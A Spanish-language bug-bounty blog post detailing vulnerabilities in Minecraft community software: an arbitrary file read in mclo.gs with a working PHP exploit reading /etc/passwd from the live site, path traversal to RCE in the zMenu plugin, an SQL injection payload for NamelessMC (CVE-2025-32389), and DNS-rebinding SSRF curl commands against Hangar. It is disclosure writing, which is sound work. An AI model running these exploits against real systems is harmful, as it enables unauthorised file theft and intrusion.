---
title: "Blocks Bounty"
description: "Buscando vulnerabilidades en software dedicado a Minecraft."
tags: ["Path traversal", "SQL Injection", "CVE-2025-32389", "SSRF", "DNS Rebinding"]
categories: ["Posts", "Stories"]
logo: "/assets/posts/minecraft_bounty/logo.svg"
---

Técnicamente este post sería la continuación al último [Bots Bounty](/posts/bots_bounty2) que hice, pero aquí va dedicado a otro enfoque.

En este post estaré explicando con detalles vulnerabilidades y bugs que encontré en distintos software que son utilizados por la comunidad de desarrolladores y administradores de servidores de Minecraft. He encontrado cositas interesantes.

## Arbitrary File Read - mclo.gs

[mclo.gs](https://mclo.gs) es una página que muchos administradores de servidores de  Minecraft utilizan para subir logs de sus servidores y así, recibir soporte en servidores de Discord y foros dedicados al desarrollo de servidores del juego.

![Portal mclo.gs](/assets/posts/minecraft_bounty/mclogs_portal.png)
*Portal de la web oficial*

Esta página tiene su [código fuente](https://github.com/aternosorg/mclogs) publicado en GitHub, y está programada en PHP nativo.

Inspeccionando el código, vi que para cargar logs, el endpoint `/1/raw` de la API hacía lo siguiente:

```php
<?php

header('Access-Control-Allow-Origin: *');

$urlId = substr($_SERVER['REQUEST_URI'], strlen("/1/raw/"));
$id = new Id($urlId);
$log = new Log($id);

if(!$log->exists()) {
    header('Content-Type: application/json');
    http_response_code(404);

    $out = new stdClass();
    $out->success = false;
    $out->error = "Log not found.";

    echo json_encode($out);
    exit;
}

$log->renew();

header('Content-Type: text/plain');
echo $log->get()->getLogfile()->getContent();
```
{: file="api/endpoints/raw.php" }

Solamente está tomando lo que venga después de la URI que especificamos, y eso mismo se lo pasa como parámetro al objeto `Id` cuyo constructor contiene lo siguiente:

```php
public function __construct(?string $fullId = null){
        if ($fullId === null) {
            $this->regenerate();
        } else {
            $this->fullId = $fullId;
            $this->decode();
        }
}

```
{: file="core/src/Id.php" }

La función `Id#decode` simplemente hace esto:

```php
private function decode(): bool{
    $config = Config::Get("id");
    $chars = str_split($config['characters']);

    $this->rawId = substr($this->fullId, 1);
    $encodedStorageId = substr($this->fullId, 0, 1);

    $index = array_search($encodedStorageId, $chars) + strlen($this->rawId) * count($chars);
    foreach (str_split($this->rawId) as $rawIdPart) {
        $index -= array_search($rawIdPart, $chars);
    }

    $this->storageId = $chars[$index % count($chars)];

    return true;
}
```

A simple vista esto tiene un problema y es que no hace ninguna validación. Mirando el código podemos ver que separa la cadena de la URI que vimos arriba en dos partes:

- `rawId = cadena[1:longitud_total]`
- `encodedStorageId = cadena[0:1]`

La variable `$index` será la suma de la posición del carácter de `encodedStorageId` en el arreglo `$chars` y el producto de la longitud de `rawId` y la cardinalidad del alfabeto.

Ahora, `$chars` podemos considerarlo como un alfabeto $\sum$ cuya cardinalidad o tamaño es de 62, que viene dado por la siguiente definición en la configuración de la web:

```php
<?php

$config = [

    /**
     * Available characters for ID generation
     *
     * Don't change! This will break all old IDs.
     */
    "characters" => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",

    /**
     * ID length (-1 for storage ID)
     */
    "length" => 6

];
```
{: file="core/config/id.php" }

Vale, por lo que podemos analizar la variable `$index` definida por lo anterior dicho luego se le restará en bucle el valor ordinal de cada carácter de `rawId` con respecto al alfabeto, y ese valor módulo la cantidad de carácteres en el alfabeto (su cardinalidad) será el `storageId`.

Todo bien por aquí excepto lo primero que mencioné, pero viendo ahora el objeto `Log` me percaté de algo aún más interesante, especificamente en `Log#load`:

```php
private function load(){
        $config = Config::Get('storage');

        if (!isset($config['storages'][$this->id->getStorage()])) {
            $this->exists = false;
            return;
        }

        /**
         * @var StorageInterface $storage
         */
        $storage = $config['storages'][$this->id->getStorage()]['class'];

        $data = $storage::Get($this->id);

        if ($data === null) {
            $this->exists = false;
            return;
        } else {
            $this->data = $data;
            $this->exists = true;
        }

        $this->analyse();
        $this->printer = (new Printer())->setLog($this->log)->setId($this->id);
}
```

Como esto *tampoco* hace validación alguna, si logro hacer que el id del storage valga lo que yo quiero, podría cargar el tipo de almacenamiento que yo quisiera.

Viendo los almacenamientos disponibles, ya vi lo que me pondría los ojos con estrellas:

```php
<?php

$config = [

    /**
     * Available storages with ID, name and class
     *
     * The class should implement \Storage\StorageInterface
     */
    "storages" => [
        "m" => [
            "name" => "MongoDB",
            "class" => "\\Storage\\Mongo"
        ],
        "f" => [
            "name" => "Filesystem",
            "class" => "\\Storage\\Filesystem"
        ],
        "r" => [
            "name" => "Redis",
            "class" => "\\Storage\\Redis"
        ]
    ],

    /**
     * Current storage id for new data
     *
     * Should be a key in the $storages array
     */
    "storageId" => "m",

    /**
     * Time in seconds to store data after put or last renew
     */
    "storageTime" => 90 * 24 * 60 * 60,

    /**
     * Maximum string length to store
     *
     * Will be cut by \Filter\Pre\Length
     */
    "maxLength" => 10 * 1024 * 1024,

    /**
     * Maximum number of lines to store
     *
     * Will be cut by \Filter\Pre\Lines
     */
    "maxLines" => 25_000

];
```
{: file="core/config/storage.php" }

Estos carácteres que se usan como llaves para identificar los tipos de almacenamiento son los que se colocan en el campo `storageId` en los objetos `Id`. Por defecto, esto usa MongoDB como almacenamiento, asi que cualquier log generado por una aplicación con los valores por defecto siempre tendrá el valor `m` en el campo `storageId` al ser decodificada su ID... y sabiendo que esto no tiene casi validación podríamos intentar crear una ID que al ser decodificada marque su `storageId` como `f` y así cargar el almacenamiento de archivos arbitrariamente.

Ahora, si vemos como la clase de almacenamiento interno `Filesystem` carga los archivos, veremos que:

```php
public static function Get(\Id $id): ?string{
        $config = \Config::Get("filesystem");
        $basePath = CORE_PATH . $config['path'];

        if (!file_exists($basePath . $id->getRaw())) {
            return false;
        }

        return file_get_contents($basePath . $id->getRaw()) ?: null;
}
```
{: file="core/src/Storage/Filesystem.php" }

Básicamente lo único que requiere es que el archivo exista. 

Entonces, volviendo a lo de la decodificación de las IDs, debido a que el valor ordinal de `f` en el alfabeto $\sum$ es 5, necesitaremos que la definición de la variable `$index` que es la siguiente matemáticamente:

$$
  index = \sigma(c) + |u||s|
$$

> Donde $\sigma$ es el equivalente a la función `array_search` en PHP, $\|u\|$ es la cardinalidad (tamaño) del conjunto de carácteres dentro de `$rawId` y $\|s\|$ es la cardinalidad del conjunto que representa el alfabeto $\sum$ definido anteriormente.
{: .prompt-info }

Satisfaga la siguiente ecuación

$$
  [index - \sum^n_{i=0}\sigma(u_i)] \mod 62 = 5
$$

Debido al [funcionamiento](https://www.php.net/manual/en/function.array-search.php) de $\sigma$, tendremos las cosas simplificadas:

> Returns the key for needle if it is found in the array (haystack), false otherwise. 

Para cualquier carácter que no esté en el alfabeto, esta función simplemente devolverá `false` que es equivalente a $0$, por lo que entonces de los carácteres de barras y puntos (../) no tendremos que preocuparnos.

Finalmente, para satisfacer la ecucación mencionada anteriormente simplemente podríamos tomar el módulo, restarselo a $62$, luego sumarle 5 y utilizamos el número que nos de para definir el primer carácter de la ID como `$chars[numero_en_cuestion]` (la explicación te la dejo a ti para que la pienses, álgebra modular).

Una implementación sencilla de esta lógica seria:

```php
<?php

$filename = "/etc/passwd";
$host = "<url>";

$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
$chars_arr = str_split($chars);
$chars_size = count($chars_arr);

$rawId = "../../../.." . $filename;
$p = strlen($rawId)*$chars_size;

// Compute complement 
foreach(str_split($rawId) as $c){
    $p -= array_search($c, $chars_arr);
}

// Now calculate a char from the alphabet whose key $k in chars_arr satisfies $k + $p (mod $chars_size) = 5
// As $chars[5] == 'f', this will let us load the Filesystem storage class and get a file from the host system
$char = $chars_size - ($p % $chars_size) + 5;
$final_payload = $chars[$char] . $rawId;

// Now just invoke cURL!
system("curl -v --path-as-is $host/1/raw/$final_payload");
```

Al probarlo con la web oficial de mclo.gs:

```bash
❯ php afr.php
... [snip]
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / id-ecPublicKey
* ALPN: server accepted h2
* Server certificate:
*  subject: CN=mclo.gs
*  start date: Jan  5 02:33:27 2025 GMT
*  expire date: Apr  5 03:33:23 2025 GMT
*  subjectAltName: host "api.mclo.gs" matched cert's "*.mclo.gs"
*  issuer: C=US; O=Google Trust Services; CN=WE1
*  SSL certificate verify ok.
*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA256
*   Certificate level 1: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA384
*   Certificate level 2: Public key type EC/secp384r1 (384/192 Bits/secBits), signed using ecdsa-with-SHA384
* Connected to api.mclo.gs (104.26.6.63) port 443
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://api.mclo.gs/1/raw/S../../../../etc/passwd
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: api.mclo.gs]
* [HTTP/2] [1] [:path: /1/raw/S../../../../etc/passwd]
* [HTTP/2] [1] [user-agent: curl/8.11.1]
* [HTTP/2] [1] [accept: */*]
} [5 bytes data]
> GET /1/raw/S../../../../etc/passwd HTTP/2
> Host: api.mclo.gs
> User-Agent: curl/8.11.1
> Accept: */*
> 
* Request completely sent off
< HTTP/2 200 
< date: Fri, 28 Feb 2025 19:32:46 GMT
< content-type: text/plain;charset=UTF-8
< access-control-allow-origin: *
< cf-cache-status: DYNAMIC
< report-to: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=IT%2BsU%2FYOm9tXFWHWKt%2Fac2Ur9NSuL2j62TNLHkwSupgdMpgevBhaL1S5vrBFZlvqtMl9IJfsh9pdT8kLKApG9FfJiaqNnu%2FeEVHiaPeQvdK9Nad31WPh7ipOB%2Fkw"}],"group":"cf-nel","max_age":604800}
< nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
< strict-transport-security: max-age=15552000; includeSubDomains; preload
< x-content-type-options: nosniff
< server: cloudflare
< cf-ray: 9192d7a8de10cacb-GIG
< server-timing: cfL4;desc="?proto=TCP&rtt=142225&min_rtt=128935&rtt_var=40481&sent=6&recv=8&lost=0&retrans=0&sent_bytes=3398&recv_bytes=774&delivery_rate=18768&cwnd=253&unsent_bytes=0&cid=6a8f32d9b6834ecc&ts=821&x=0"
< 
{ [5 bytes data]
100  2474    0  2474    0     0   2164      0 --:--:--  0:00:01 --:--:--  2166
* Connection #0 to host api.mclo.gs left intact
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
... [snip]
```

Algo bastante divertido de explotar la verdad.

Reportando el fallo a Aternos, a las horas solucionaron el bug agregando una nueva función que hace estas verificaciones:

```php
protected function isValid(): bool{
        $config = Config::Get("id");

        $expectedLength = $config['length'] + 1;
        if (strlen($this->fullId) !== $expectedLength) {
            return false;
        }

        $expectedChars = str_split($config['characters']);
        $chars = str_split($this->fullId);
        foreach ($chars as $char) {
            if (!in_array($char, $expectedChars)) {
                return false;
            }
        }
        return true;
}
```

y también agregaron una opción para activar o desactivar los almacenamientos, por defecto solamente estaría activo el de MongoDB. Lo que deja a esta vulnerabilidad completamente parcheada.

**No hubo recompensa**

## Arbitrary File Write -> RCE - zMenu

[zMenu](https://www.spigotmc.org/resources/zmenu-ultra-complete-menu-plugin.110402/) es un plugin para servidores de Minecraft que usan la API de CraftBukkit como [Spigot](https://www.spigotmc.org/) y [Paper](https://papermc.io) con la principal función de crear menús personalizados utilizando los inventarios de Minecraft, que pueden ser invocados con comandos. Tiene bastantes opciones personalizables para que los administradores de servidores puedan crear unos muy bonitos menús en sus servidores 

Viendo los comandos que poseía el plugin, hay unos cuantos que me llamaron la atención, especialmente el comando `/zmenu download` que te permitía bajar menús de servidores externos:

![zMenu Commands](/assets/posts/minecraft_bounty/zmenu_commands.png)

Siendo el plugin de código abierto, será fácil inspeccionar su código. El de dicho comando es el siguiente:

```java
public class CommandMenuDownload extends VCommand {

    public CommandMenuDownload(MenuPlugin plugin) {
        super(plugin);
        this.setDescription(Message.DESCRIPTION_DOWNLOAD);
        this.addSubCommand("download", "dl");
        this.setPermission(Permission.ZMENU_DOWNLOAD);
        this.addRequireArg("link");
        this.addOptionalArg("force", (a, b) -> Arrays.asList("true", "false"));
    }

    @Override
    protected CommandType perform(MenuPlugin plugin) {

        String link = this.argAsString(0);
        boolean force = this.argAsBoolean(1, false);

        /*DownloadFile downloadFile = new DownloadFile();
        runAsync(plugin, () -> downloadFile.download(plugin, this.sender, link));*/
        plugin.getWebsiteManager().downloadFromUrl(this.sender, link, force);

        return CommandType.SUCCESS;
    }
```
{: file="src/fr/maxlego08/menu/command/commands/website/CommandMenuDownload.java" }

El método `downloadFromUrl` de la clase `ZWebsiteManager` hace lo siguiente:

```java
public void downloadFromUrl(CommandSender sender, String baseUrl, boolean force) {

        message(sender, Message.WEBSITE_DOWNLOAD_START);
        plugin.getScheduler().runTaskAsynchronously(() -> {

            try {
                String finalUrl = followRedirection(baseUrl);

                URL url = new URL(finalUrl);
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                String fileName = getFileNameFromContentDisposition(httpURLConnection);

                if (fileName == null) {
                    message(sender, Message.WEBSITE_DOWNLOAD_ERROR_NAME);
                    return;
                }

                if (!isYmlFile(httpURLConnection) && !fileName.endsWith(".yml")) {
                    message(sender, Message.WEBSITE_DOWNLOAD_ERROR_TYPE);
                    return;
                }

                File folder = new File(this.plugin.getDataFolder(), "inventories/downloads");
                if (!folder.exists()) folder.mkdirs();
                File file = new File(folder, fileName);

                if (file.exists() && !force) {
                    message(sender, Message.WEBSITE_INVENTORY_EXIST);
                    return;
                }

                HttpRequest request = new HttpRequest(finalUrl, new JsonObject());
                request.setMethod("GET");

                request.submitForFileDownload(this.plugin, file, isSuccess -> message(sender, isSuccess ? Message.WEBSITE_INVENTORY_SUCCESS : Message.WEBSITE_INVENTORY_ERROR, "%name%", fileName));
            } catch (IOException exception) {
                exception.printStackTrace();
                message(sender, Message.WEBSITE_DOWNLOAD_ERROR_CONSOLE);
            }
        });
}
```
{: file="src/fr/maxlego08/menu/website/ZWebsiteManager.java" }

El método `isYmlFile` solamente verifica que la cabecera `Content-Type` retornada por el servidor sea `application/x-yaml` o `text/yaml`, mientras que el `getFileNameFromContentDisposition` hace esto:

```java
private String getFileNameFromContentDisposition(HttpURLConnection conn) {
        String contentDisposition = conn.getHeaderField("Content-Disposition");
        if (contentDisposition != null) {
            int index = contentDisposition.indexOf("filename=");
            if (index > 0) {
                return contentDisposition.substring(index + 9).replaceAll("\"", "");
            }
        }
        return generateRandomString(16);
}
```
{: file="src/fr/maxlego08/menu/website/ZWebsiteManager.java" }

Seguramente ya habrás notado un problema con esto si razonas un poco, y es que está tomando el nombre del archivo tal cual como se lo envia el servidor y luego se lo concatena al path de un objeto `File` como vimos arriba. Lo que significa que si un servidor le envia una cabecera como `Content-Disposition: attachment; filename="../../../../../../test.yml"` a la petición que hace el plugin, hará que este escriba el archivo `test.yml` en un directorio fuera de lugar, y sabiendo que muchos plugins e incluso el propio servidor de Spigot utilizan el formato yml para las configuraciones esto significa que podemos sobrescribir dichos archivos, ya que el plugin cuenta con un paŕametro para forzar la escritura en el comando que te permite hacerlo. 

Veamos un ejemplo de esto último que dije.

#### Obteniendo RCE con Spigot

Hay un ajuste del `spigot.yml` llamado `restart-script`, que según la documentación de Spigot:

> restart-script
> *Default*: ./start.sh
> *Type*: String (File path)
> *Description*: The location for your server's startup script. This path will be used for the /restart command and for the restart-on-crash option. For Windows, change .sh to .bat extension.
>
> https://www.spigotmc.org/wiki/spigot-configuration/

Por lo que podemos pensar, esto simplemente ejecutará el archivo indicado, y por el propio bug nosotros podemos descargar un archivo que contenga un comando dentro de la carpeta de zMenu (Debido a que lo único que verifica es que la cabecera `Content-Type` sea la de un YAML, como dije). Es algo que podemos utilizar para obtener ejecución de comandos en un servidor remoto como podrás ver en el siguiente vídeo:

<iframe width="560" height="315" src="https://www.youtube.com/embed/p-HPVEwi_0o?si=WEl20GTzR70KzFV2" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

Reportando la vulnerabilidad, uno de los desarrolladores del plugin me atendió pero parece que lo único que hizo fue desactivar el comando por defecto, semanas después de reportar la vulnerabilidad.

> Debo decir que el sistema de soporte de este plugin es medio problemático, porque tienes que pagar si quieres que el staff te atienda directamente.
{: .prompt-info }

**No hubo recompensa evidentemente**

## SQL injection - NamelessMC

[Nameless](https://namelessmc.com/) es un software de foro diseñado especialmente para servidores de Minecraft. Es utilizado por varias comunidades para diseñar sus foros y páginas web principales.

Clonando e inspeccionando el código web, me puse a ver la parte del módulo principal `Core`... y buscando por vulnerabilidades encontré esto en `modules/Core/pages/user/messaging.php#L294`:

```php
... [snip]
if (isset($_GET['uid'])) {
    // Messaging a specific user
    $user_messaging = DB::getInstance()->get('users', ['id', $_GET['uid']]);

    if ($user_messaging->count()) {
        $template->getEngine()->addVariable('TO_USER', Output::getClean($user_messaging->first()->username));
    }
}
... [snip]
```
{: file="modules/Core/pages/user/messaging.php"}

El parámetro `uid` de la URL era utilizado para una query si el parámetro `action` era `new` y sin ningún tipo de validación posterior, ahora viendo el método `DB#get`:

```php
public function get(string $table, $where = [])
{
    if (!is_array($where)) {
        $where = ['id', '=', $where];
    }

    return $this->action('SELECT *', $table, $where);
}

```
{: file="core/classes/Database/DB.php"}

El método `DB#action` hace lo siguiente:

```php
private function action(string $action, string $table, array $where = [])
{
    [$where, $where_params] = $this->makeWhere($where);

    $table = $this->_prefix . $table;
    $sql = "{$action} FROM {$table} {$where}";

    if (!$this->query($sql, $where_params)->error()) {
        return $this;
    }

    return false;
}
```
{: file="core/classes/Database/DB.php"}

y finalmente `DB#makeWhere`:

```php
public static function makeWhere(array $clauses): array
{
    if (count($clauses) === count($clauses, COUNT_RECURSIVE)) {
        return self::makeWhere([$clauses]);
    }

    $where_clauses = [];
    foreach ($clauses as $clause) {
        if (!is_array($clause)) {
            continue;
        }

        if (count($clause) !== count($clause, COUNT_RECURSIVE)) {
            self::makeWhere(...$clause);
            continue;
        }

        $column = null;
        $operator = '=';
        $value = null;
        $glue = 'AND';

        switch (count($clause)) {
            case 4:
                [$column, $operator, $value, $glue] = $clause;
                break;
            case 3:
                [$column, $operator, $value] = $clause;
                break;
            case 2:
                [$column, $value] = $clause;
                break;
            default:
                throw new InvalidArgumentException('Invalid where clause');
        }

        if (!in_array($operator, ['=', '<>', '<', '>', '<=', '>=', 'LIKE', 'NOT LIKE'])) {
            throw new InvalidArgumentException("Invalid operator: {$operator}");
        }

        $where_clauses[] = [
            'column' => $column,
            'operator' => $operator,
            'value' => $value,
            'glue' => $glue,
        ];
    }

    $first = true;
    $where = '';
    $params = [];
    foreach ($where_clauses as $clause) {
        if ($first) {
            $where .= 'WHERE ';
            $first = false;
        } else {
            $where .= " {$clause['glue']} ";
        }

        $where .= "`{$clause['column']}` {$clause['operator']} ?";
        $params[] = $clause['value'];
    }

    return [$where, $params];
}
```
{: file="core/classes/Database/DB.php"}

Puede que veas esto como un código inocente que hace validaciones, pero yo ya estoy viendo un severo problema acá, y es en lo que dije al principio.

Si bien en el RFC de URL esto no está estandarizado, PHP puede aceptar arreglos como parámetros GET o en el cuerpo de peticiones POST, siendo esto con la sintaxis `array[key]=value`. Si `key` es un número, PHP verá esto como un arreglo normal cuyo valor en el índice `key` vale `value`

```php
array(<n>) {
  [key]=>
  <data-type> <value> 
}
```

Lo que implica que podemos hacer que el código del principio le pase un arreglo a las funciones que serán ejecutadas por la clase `DB` para preparar y ejecutar la consulta a la base de datos, y la última función que mostré parece que se ejecuta recursivamente entre los arreglos:

```php
if (count($clause) !== count($clause, COUNT_RECURSIVE)) {
    self::makeWhere(...$clause);
    continue;
}
```

y esta condición simplemente ignorará cualquier cosa que no sea un arreglo, como la cadena de texto que nos agrega la llamada inicial para identificar la columna por la que filtrar

```php
if (!is_array($clause)) {
    continue;
}
```

Esto quiere decir que si yo le paso `["thing", ["thing2"]]` a la función, va a tomar el segundo elemento como una lista de parámetros aparte para procesar. La función se encarga de recibir pares de parámetros donde por defecto se utiliza el primer elemento del arreglo para identificar la tabla a consultar y asígnarselo a una consulta a ser preparada:

```sql
WHERE `table_name` = ? 
```

y el segundo elemento se agrega a un arreglo de elementos que será utilizado por el driver SQL para rellenar los parámetros de la sentencia preparada en cuestión. 

Creo que es evidente que podemos hacer acá. También podemos agregar un operador de relación binaria y conjunción/disjunción lógica pero no lo necesitamos, ¡ya que con simplemente controlar el nombre de la tabla podemos inyectar código SQL ya que no se hace ningún tipo de validación al respecto!

Introduciendo lo siguiente en los párametros GET estando en la URI

```bash
https://website.com/user/messaging/?action=new&uid[0]=<some_table_name>` = 'something' UNION SELECT... [snip]&uid[1]=uwu
```

Veremos que:

![when sql](/assets/posts/minecraft_bounty/nameless_sqli.png)

Se ejecuta, sin embargo no podemos ver el resultado de las consultas porque el servidor solo se limita a mostrarnos valores que *realmente* existan al parecer, pero jugando con lógica binaria como se ve en la imagen podemos hacer que continuamente nos filtre datos almacenados.

No obstante, esta misma vulnerabilidad también se encuentra presente en la página `/panel/user/reports/`:

```php
if (!isset($_GET['id'])) {
    ... [snip]
} else {
    if (!isset($_GET['action'])) {
        $report = DB::getInstance()->get('reports', ['id', $_GET['id']])->results();
        ... [snip]
    }
}
```
{: file="modules/Core/pages/panel/users_reports.php" }

y en esta si podemos ver lo que nos devuelve:

![MariaDB](/assets/posts/minecraft_bounty/nameless_sqli2.png)

Un vector de ataque contra esta aplicación bastante conveniente es primero filtrar datos que nos permitan escalar a un usuario de altos privilegios ya sea moderador o administrador, y llegar a esta parte vulnerable. (aunque si llegas a obtener privilegios administrativos directamente puedes instalar un módulo malicioso)

> Recordatorio de porque es súper necesario validar tipos en lenguajes débilmente tipados como PHP.
{: .prompt-tip }

El advisory de GitHub de la vulnerabilidad puedes verlo [acá](https://github.com/NamelessMC/Nameless/security/advisories/GHSA-5984-mhcp-cq2x). La vulnerabilidad fue catalogada como CVE-2025-32389.

**No hubo recompensa**

## Blind SSRF - Hangar

[Hangar](https://hangar.papermc.io/) es un repositorio de plugins para software de servidores de Minecraft desarrollado por la organización PaperMC. Puedes encontrar plugins para proxies como Velocity, Waterfall o servidores Paper/Folia.

La aplicación está programada en el framework Spring Boot, lo que ciertamente complica un poco abusar cierto tipo de vulnerabilidad por la restricción de tipos de Java.

Clonando el repositorio, mientras veía el código del Backend noté un controlador (ImageProxyController, `/api/internal/image/<URL>`) que servía para obtener imágenes de servidores externos:

```java
@GetMapping("/**")
public StreamingResponseBody proxy(final HttpServletRequest request, final HttpServletResponse res) {
        final String query = StringUtils.hasText(request.getQueryString()) ? "?" + request.getQueryString() : "";
        final String url = this.cleanUrl(request.getRequestURI() + query);
        if (this.validTarget(url)) {
            ClientResponse clientResponse = null;
            try {
                clientResponse = this.webClient.get()
                    .uri(new URL(url).toURI())
                    .headers((headers) -> this.passHeaders(headers, request))
                    .exchange().block(); // Block the request, we don't get the body at this point!
                if (clientResponse == null) {
                    throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR, "Encountered an error whilst trying to load url");
                }
                // block large stuff
                if (this.contentTooLarge(clientResponse)) {
                    throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "The image you are trying too proxy is too large");
                }
                // forward headers
                for (final Map.Entry<String, List<String>> stringListEntry : clientResponse.headers().asHttpHeaders().entrySet()) {
                    res.setHeader(stringListEntry.getKey(), stringListEntry.getValue().get(0));
                }
                // Ask to have the body put into a stream of data buffers
                final Flux<DataBuffer> body = clientResponse.body(BodyExtractors.toDataBuffers());
                if (this.validContentType(clientResponse)) {
                    res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data:;"); // no xss for you sir
                    return (StreamingResponseBody) o -> {
                        // Write the data buffers into the outputstream as they come!
                        final Flux<DataBuffer> flux = DataBufferUtils
                            .write(body, o)
                            .publish()
                            .autoConnect(2);
                        flux.subscribe(DataBufferUtils.releaseConsumer()); // Release the consumer as we are using exchange, prevent memory leaks!
                        try {
                            flux.blockLast(); // Wait until the last block has been passed and then tell Spring to close the stream!
                        } catch (final RuntimeException ex) {
                            throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR, "Encountered " + ex.getClass().getSimpleName() + " while trying to load " + url);
                        }
                    };
                } else {
                    throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Bad content type");
                }
            } catch (final WebClientRequestException | MalformedURLException | URISyntaxException ex) {
                throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR, "Encountered " + ex.getClass().getSimpleName() + " while trying to load " + url, ex);
            } finally {
                if (clientResponse != null) {
                    // noinspection ReactiveStreamsUnusedPublisher
                    clientResponse.releaseBody(); // Just in case...
                }
            }
        } else {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Bad target");
        }
}
```
{: file="backend/src/main/java/io/papermc/hangar/components/images/controller/ImageProxyController.java" }

Pude ver que además de verificar de que es una URL válida también verifica el `Content-Type` de la respuesta. Lo que me limita a ver el contenido de respuestas que solo sean imágenes por el propio método `validContentType`:

```java
private boolean validContentType(final ClientResponse response) {
        try {
            final var contentType = response.headers().contentType();
            return contentType.isPresent() && contentType.get().getType().equals("image");
        } catch (final InvalidMediaTypeException ignored) {
            return false;
        }
}
```

Del otro lado, el método `validTarget` hace esto:

```java
private boolean validTarget(final String url) {
        try {
            final URL parsedUrl = new URL(url);
            // valid proto
            if (!parsedUrl.getProtocol().equals("http") && !parsedUrl.getProtocol().equals("https")) {
                return false;
            }
            final InetAddress inetAddress = InetAddress.getByName(parsedUrl.getHost());
            // not local ip
            if (inetAddress.isAnyLocalAddress() || inetAddress.isLoopbackAddress() || inetAddress.isSiteLocalAddress()) {
                return false;
            }
        } catch (final MalformedURLException | UnknownHostException e) {
            return false;
        }

        return true;
}
```

Verifica que la URL realmente usa el protocolo HTTP(S) y que no se está haciendo ninguna petición a direcciones IPv4/IPv6 internas. Eso último está bien, pero en el código del método que vimos del principio, la aplicación crea un objeto URL aparte en vez de usar el que ya se creó para verificar si es una URL válida. 

Verás, cuando creas un objeto URL y abres una conexión, Java tiene que obtener la IPv4 del servidor por medio de DNS en caso de ser un dominio, y si en el método que verifica que la dirección es válida ya se hace una petición DNS entonces estarías haciendo dos peticiones distintas para verificar y conectarte al servidor... ¿qué pasa si yo envío un registro con una dirección válida en la primera solicitud, y en la segunda envío un registro con contenido `127.0.0.1`? Técnicamente ya la URL está "verificada" por lo que el servidor procedería a enviarle la petición a `127.0.0.1` sin ningún problema.

Esto es formalmente conocido como un ataque de DNS rebinding o revinculación DNS. Básicamente un servidor DNS personalizado envía un registro con TTL 0 que apunte a una dirección regular y luego envia otro que apunte a una dirección interna en lo que el servidor vuelva a solicitar el contenido del registro.

Voy a utilizar [Singularity](https://github.com/nccgroup/singularity) para poner a prueba esto en Hangar y ver hasta donde llego.

Dejando el servidor de `singularity` iniciar y luego haciéndole una petición a un subdominio bajo el control del mismo, vemos que en la primera petición todo fluye normal, y el backend de Hangar nos tira un error acerca de que no puede procesar el tipo de contenido devuelto por el servidor (El servidor DNS devolvió primero `1.1.1.1` ante la petición inicial):

```bash
 ❯ curl -v http://10.8.0.1:8080/api/internal/image/http://s-01010101.7f000001-760894422-fs-e.dynamic.vzondev.xyz/uwuowo     
*   Trying 10.8.0.1:8080...
* Connected to 10.8.0.1 (10.8.0.1) port 8080
* using HTTP/1.x
> GET /api/internal/image/http://s-01010101.7f000001-760894422-fs-e.dynamic.vzondev.xyz/uwuowo HTTP/1.1
> Host: 10.8.0.1:8080
> User-Agent: curl/8.12.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 500 Internal Server Error
< Expires: Thu, 01 Jan 1970 00:00:01 GMT
< CF-RAY: 936763cbeb0178e2-EWR
< Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Server: cloudflare
< X-XSS-Protection: 0
< X-Frame-Options: DENY
< Referrer-Policy: same-origin
< Date: Sat, 26 Apr 2025 16:17:21 GMT
< Connection: close
< Vary: Origin
< Vary: Access-Control-Request-Method
< Vary: Access-Control-Request-Headers
< X-Content-Type-Options: nosniff
< Content-Type: text/plain;charset=UTF-8
< Content-Length: 0
< 
* shutting down connection #0
```

(Nota que en las cabeceras, Hangar devuelve las mismas devueltas por el servidor en caso de producirse un error)

No recibo nada interesante, parece que simplemente se quedó con lo devuelto inicialmente por el servidor DNS. Al mismo tiempo, vuelvo a hacer la misma petición pero cambiándole el puerto a `7700` (El entorno local de pruebas provee un servidor Meilisearch para temas de indexado y demás en este puerto) y recibo esto:

```bash
❯ curl -v http://10.8.0.1:8080/api/internal/image/http://s-01010101.7f000001-760894422-fs-e.dynamic.vzondev.xyz:7700/testing123
*   Trying 10.8.0.1:8080...
* Connected to 10.8.0.1 (10.8.0.1) port 8080
* using HTTP/1.x
